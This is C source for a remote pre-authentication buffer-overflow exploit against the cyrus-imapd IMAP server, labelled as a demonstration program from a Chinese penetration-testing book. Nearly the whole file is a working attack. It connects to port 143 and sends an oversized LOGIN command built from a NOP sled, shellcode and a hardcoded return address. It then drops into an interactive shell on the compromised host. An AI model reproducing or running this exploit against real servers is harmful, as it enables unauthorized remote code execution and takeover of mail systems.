/* x_cyrus-imapd_login.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  cyrus-imapd IMAPMAGICPLUS preauthentification buffer overflow exploit
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#include "shellcode_amazing.c"

// maybe need adjust
#define RET 0xbfffced0

// ripped from isno
int Make_Connection(char *address,int port,int timeout)
{
    struct sockaddr_in target;
    int s,i,bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr==0)
    {
        close(s);
        return -2;
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctl(s,FIONBIO,&bf);
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        close(s);
        return -3;
    }
    if(i==0)
    {
        close(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        close(s);
        return -5;
    }
    ioctl(s,FIONBIO,&bf);
    return s;
}

/* ripped from TESO code */
void shell (int sock)
{
    int     l;
    char    buf[512];
    fd_set  rfds;

    while (1) {
        FD_SET (0, &rfds);
        FD_SET (sock, &rfds);

        select (sock + 1, &rfds, NULL, NULL, NULL);

        if (FD_ISSET (0, &rfds)) {
            l = read (0, buf, sizeof (buf));
            if (l <= 0) {
                perror ("read user");
                exit (EXIT_FAILURE);
            }
            write (sock, buf, l);
        }

        if (FD_ISSET (sock, &rfds)) {
            l = read (sock, buf, sizeof (buf));
            if (l <= 0) {
                perror ("read remote");
                exit (EXIT_FAILURE);
            }
            write (1, buf, l);
        }
    }
}

int main(int argc, char *argv[]) { 
    unsigned char Buff[545], data[256];
    unsigned char identify[4] = "Xc0n";
    
    int s, i, j;
    
    if (argc < 2) {
        printf("Usage: %s remote_ip\n", argv[0]);
        exit(1);
    }
    s = Make_Connection(argv[1], 143, 10);
    if (!s) {
        printf("[-] Connect failed. \n");
        exit(1);
    }

#ifdef DEBUG
    getchar();
#endif

    GetShellcode();
    if (!sh_Len) {
        printf("[-] Get ShellCode failed.\n");
        exit(1);
    }
    //PrintSc(sh_Buff, sh_Len);
/*
for (j=0; j<sh_Len; j++) {
    s = Make_Connection(argv[1], 143, 10);
    if (!s) {
        printf("[-] Connect failed. \n");
        exit(1);
    }
//*/
    printf("[+] Server Information.\n");
    i = recv(s, data, sizeof(data), 0);
    if (i <= 0) {
        printf("[-] Recv failed. \n");
        exit(1);
    }
    data[i] = '\0';
    printf("%s", data);
    
    printf("[+] Send CAPABILITY.\n");
    memset(data, 0, sizeof(data));
    strcat(data, "ABCF0 CAPABILITY\r\n");
    i = send(s, data, strlen(data), 0);
    if (i <= 0) {
        printf("[-] Send failed. \n");
        exit(1);
    }
    i = recv(s, data, sizeof(data), 0);
    if (i <= 0) {
        printf("[-] Recv failed. \n");
        exit(1);
    }
    data[i] = '\0';
    printf("%s", data);

    printf("[+] Send Evil Data.\n");
    memset(Buff, 0x90, sizeof(Buff));
    //memset(Buff, (unsigned char *)sh_Buff[j], sizeof(Buff));
    memcpy(Buff, "ABCF1 LOGIN ", 12);
    strcpy(Buff + (sizeof(Buff) - sh_Len - 4 - 5), sh_Buff);
    *(unsigned int *)&Buff[12 + 524] = RET;
    memcpy(Buff + 12 + 528, " \"\"\r\n", 5);
PrintSc(Buff, 545);
    
    i = send(s, Buff, sizeof(Buff), 0);
    if (i <= 0) {
        printf("[-] Send failed. \n");
        exit(1);
    }
/*
// test
    i = recv(s, data, sizeof(data), 0);
    if (i <= 0) {
        printf("[-] Recv failed. \n");
    }
    data[i] = '\0';
    printf("%s", data);
sleep (1);
}
//*/
    sleep (1);
/*
    i = send(s, &identify, 4, 0);
    if (i <= 0) {
        printf("[-] Send identify data failed. \n");
        exit(1);
    }

    sleep (1);
//*/
    printf("[+] Got it?\n");
    shell(s);
}
